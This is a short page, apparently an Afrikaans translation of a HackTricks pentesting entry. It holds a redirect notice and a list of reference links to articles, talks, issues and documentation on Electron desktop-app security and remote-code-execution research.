Voorheen gepubliseerde adres vir bestaande boekmerke: [Electron-desktoptoepassings](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Die roete vir die hele bladsy herlei hierheen; die historiese fragment word nie onderhou nie.

## References

- [1] [Phishing en insameling van geloofsbriewe in Electron-toepassings](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Arbitrêre lêerlees in die Facebook Messenger Desktop App](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Misbruik van die gebrek aan context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Werkswinkel oor hacking van moderne desktop-toepassings met XSS en RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - 'n Saamgestelde lys hulpbronne oor Electron.js-(on)sekuriteit](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Misbruik van Electron-API's: 'n aanvaller se eerste keuse](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE-payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE met een klik in Electron-toepassings](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Die gevare van Electron se shell.openExternal() - baie paaie na uitvoering van afgeleë kode](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Laat arbitrêre URL's toe, verwag arbitrêre kode-uitvoering](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [RCE bereik in 'n bekende Japannese kletsinstrument met 'n verouderde Electron-funksie](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Uitvoering van afgeleë kode](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Uitvoering van afgeleë kode in Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Diefstal van GitHub-tokens met een klik via invoeging van sleutelbordgebeurtenisse in VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code-kwessie #319593: Webviews kan arbitrêre sleutelbordkortpaaie in die hoofwerkbank aktiveer](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: bevestig die oopmaak van notaboeke en hou op om installExtension-konteks te aanvaar wat deur die aanroeper verskaf word](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: blokkeer programmatiese heruitstuur van webview-sleutelindrukke/klikke in notaboek-webviews](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / plaaslike workspace-uitbreidings](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Hoe ek elke groot IDE in 2 weke gehack het](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Pwning gewilde desktop-toepassings terwyl nuwe aanvaloppervlaktes in Electron blootgelê word](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron-sekuriteit](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [REA JavaScript-artefakrekonstruksie](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA-werkvloeie vir JavaScript-toepassings oor verskillende lae](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
